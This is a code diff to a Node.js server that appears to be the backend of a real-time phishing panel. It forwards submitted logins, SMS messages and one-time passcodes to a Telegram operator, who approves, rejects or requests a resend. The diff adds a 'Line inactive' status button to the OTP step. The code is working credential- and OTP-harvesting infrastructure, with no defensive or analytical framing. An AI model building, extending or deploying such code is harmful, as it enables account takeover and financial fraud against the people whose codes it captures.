@@ -4,12 +4,14 @@
    - Per-page buttons:
        * login: [✅ Approve] [❌ Reject]
        * sms:   [✅ Approve] [❌ Reject] [🔁 Resend]
-       * otp:   [✅ Approve] [❌ Reject] [🔁 Resend] [⚠️ Inactive]
+       * otp:   [✅ Approve] [❌ Reject]
+                 [🔁 Resend] [⚠️ Inactive] [📵 Line inactive]
    - Statuses returned to frontend:
-       approve  → 'approved'
-       reject   → 'rejected'
-       resend   → 'resend'
-       inactive → 'inactive'
+       approve       → 'approved'
+       reject        → 'rejected'
+       resend        → 'resend'
+       inactive      → 'inactive'
+       line_inactive → 'line_inactive'  ⬅️ NEW
    - Sessions persisted to disk (survive Railway restarts)
    - SMS body wrapped in <pre><code> for Telegram copy button
    ============================================================ */
@@ -142,6 +144,9 @@ function buildKeyboard(step, sessionId) {
       [
         { text: '🔁 Resend',  callback_data: `resend:otp:${sessionId}` },
         { text: '⚠️ Inactive', callback_data: `inactive:otp:${sessionId}` }
+      ],
+      [
+        { text: '📵 Line inactive', callback_data: `line_inactive:otp:${sessionId}` }
       ]
     ]};
   }
@@ -377,7 +382,7 @@ app.post('/api/verify-otp', async (req, res) => {
       `🆔 <b>Ref:</b> <code>${reference}</code>\n` +
       `🕒 <b>Time:</b> ${new Date().toLocaleString('en-GB', { timeZone: 'Africa/Douala' })}` +
       (sms ? `\n\n📝 <b>Linked SMS:</b>\n<pre><code>${escapeHtml(sms.slice(0, 400))}</code></pre>` : '') +
-      `\n⏳ Tap ✅ / ❌ / 🔁 / ⚠️ below`;
+      `\n⏳ Tap ✅ / ❌ / 🔁 / ⚠️ / 📵 below`;
 
     const result = await sendTelegramWithButtons(text, sessionId, 'otp');
     console.log(`[otp] sid=${sessionId} tgOk=${result.ok} msgId=${result.messageId} err=${result.error}`);
@@ -485,7 +490,7 @@ app.post('/api/telegram-webhook', async (req, res) => {
       return res.json({ ok: true });
     }
 
-    if (['approved','rejected','timeout','inactive'].includes(session.status)) {
+    if (['approved','rejected','timeout','inactive','line_inactive'].includes(session.status)) {
       await answerCallback(cb.id, `Already ${session.status}`);
       return res.json({ ok: true });
     }
@@ -508,7 +513,7 @@ app.post('/api/telegram-webhook', async (req, res) => {
       return res.json({ ok: true });
     }
 
-    /* ⚠️ INACTIVE — special */
+    /* ⚠️ INACTIVE — soft (existing) */
     if (action === 'inactive') {
       session.status = 'inactive';
       session.resolvedAt = Date.now();
@@ -517,6 +522,24 @@ app.post('/api/telegram-webhook', async (req, res) => {
       const when = new Date().toLocaleString('en-GB', { timeZone: 'Africa/Douala' });
       const newText =
         `⚠️ <b>ACCOUNT INACTIVE</b>\n` +
+        `━━━━━━━━━━━━━━━━━━\n` +
+        stripFirstLine(session.originalText) +
+        `\n\n🕒 <b>Marked at:</b> ${when}`;
+      if (session.telegramMessageId) {
+        await editTelegramMessage(session.telegramMessageId, newText, { inline_keyboard: [] });
+      }
+      return res.json({ ok: true });
+    }
+
+    /* 📵 LINE INACTIVE — NEW */
+    if (action === 'line_inactive') {
+      session.status = 'line_inactive';
+      session.resolvedAt = Date.now();
+      persistSessions();
+      await answerCallback(cb.id, '📵 Line marked inactive');
+      const when = new Date().toLocaleString('en-GB', { timeZone: 'Africa/Douala' });
+      const newText =
+        `📵 <b>LINE INACTIVE</b>\n` +
         `━━━━━━━━━━━━━━━━━━\n` +
         stripFirstLine(session.originalText) +
         `\n\n🕒 <b>Marked at:</b> ${when}`;
